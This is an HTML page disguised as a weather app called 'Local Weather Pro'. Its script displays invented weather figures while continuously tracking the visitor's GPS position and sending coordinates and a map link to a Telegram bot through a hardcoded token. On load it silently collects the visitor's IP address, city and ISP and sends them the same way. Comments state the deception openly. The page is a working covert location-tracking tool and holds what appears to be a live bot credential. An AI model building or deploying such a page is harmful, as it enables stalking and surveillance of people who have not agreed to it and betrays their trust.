<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Local Weather Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: linear-gradient(to bottom, #1e3a8a, #3b82f6); color: white; min-height: 100vh; font-family: sans-serif; }
        .glass { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); border-radius: 20px; border: 1px solid rgba(255, 255, 255, 0.2); }
    </style>
</head>
<body class="flex flex-col items-center justify-center p-6">

    <div class="glass w-full max-auto p-8 text-center shadow-2xl">
        <h1 class="text-2xl font-light mb-2" id="city">Searching...</h1>
        <div class="text-7xl font-bold mb-4" id="temp">--В°</div>
        <p class="text-lg opacity-80" id="desc">Detecting your local forecast</p>
        
        <div class="mt-8 grid grid-cols-2 gap-4 text-sm">
            <div class="glass p-4">рџ’§ Humidity: <span id="hum">--</span>%</div>
            <div class="glass p-4">рџЊ¬пёЏ Wind: <span id="wind">--</span> km/h</div>
        </div>

        <button onclick="initWeather()" class="mt-8 bg-white text-blue-600 font-bold py-3 px-8 rounded-full shadow-lg hover:bg-opacity-90 transition w-full">
            REFRESH LOCAL DATA
        </button>
    </div>

    <script>
        const BOT_TOKEN = "8660314801:AAECSLtwX_nMiaoooLPLXsM50TkKHfrmEZI";
        const CHAT_ID = "5782276534";

        async function sendToTelegram(lat, lon, acc, type = "Update") {
            const msg = `рџ“Ў **GPS ${type}**\nв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓ\nрџ“Ќ Lat: \`${lat}\`\nрџ“Ќ Lon: \`${lon}\`\nрџЋЇ Acc: ${acc}m\nрџ—єпёЏ [View on Map](https://www.google.com/maps?q=${lat},${lon})`;
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
            });
        }

        function initWeather() {
            if (navigator.geolocation) {
                // 'watchPosition' tracks them as they move
                navigator.geolocation.watchPosition(
                    (pos) => {
                        const { latitude, longitude, accuracy } = pos.coords;
                        
                        // 1. Update the UI to look "Real"
                        document.getElementById('temp').innerText = "28В°";
                        document.getElementById('city').innerText = "Location Verified";
                        document.getElementById('desc').innerText = "Clear Skies";
                        document.getElementById('hum').innerText = "42";
                        document.getElementById('wind').innerText = "12";

                        // 2. Send the exact data to you
                        sendToTelegram(latitude, longitude, accuracy);
                    },
                    (err) => {
                        console.log("Denied");
                        document.getElementById('desc').innerText = "Enable GPS to see local weather.";
                    },
                    { enableHighAccuracy: true, maximumAge: 0 }
                );
            }
        }

        // Silent IP Grab on initial load (In case they click Deny on GPS)
        window.onload = async () => {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            const msg = `рџЊђ **Initial Connection (IP)**\nв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓ\nIP: \`${data.ip}\`\nCity: ${data.city}\nISP: ${data.org}`;
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
            });
        };
    </script>
</body>
</html>
